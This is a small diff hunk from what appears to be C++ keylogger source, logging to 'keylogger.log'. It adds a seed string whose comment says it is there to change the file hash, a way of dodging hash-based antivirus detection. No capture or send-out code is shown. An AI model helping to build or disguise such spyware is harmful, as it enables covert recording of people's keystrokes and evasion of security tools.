@@ -9,6 +9,9 @@
 #include <fstream>
 #include <ctime>
 
+// NOTE: Change seed to help you change the file hash.
+std::string seed = "3301Kira";
+
 std::string logFile = "keylogger.log";
 
 void Write(std::string data) {
